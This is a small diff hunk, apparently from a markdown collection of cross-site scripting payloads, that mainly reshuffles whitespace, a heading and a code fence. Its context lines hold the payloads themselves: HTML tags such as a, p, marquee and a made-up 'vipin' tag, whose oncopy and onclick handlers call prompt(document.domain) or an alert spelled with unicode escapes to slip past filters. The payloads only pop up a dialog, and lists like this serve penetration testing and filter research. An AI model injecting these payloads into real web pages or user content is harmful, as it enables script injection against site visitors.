@@ -16,9 +16,11 @@
 ```
 <vipin oncopy = prompt(document.domain)>
 ```
+
 <a onclick=\u0041\u006cert("_Y000!_")>Y00</a>
-###
 ```
+###
+
 <p onclick=\u0041\u006cert("_Y000!_")>Y00</p>
 
 <marquee onclick=\u0041\u006cert("_Y000!_")>Y00</marquee>
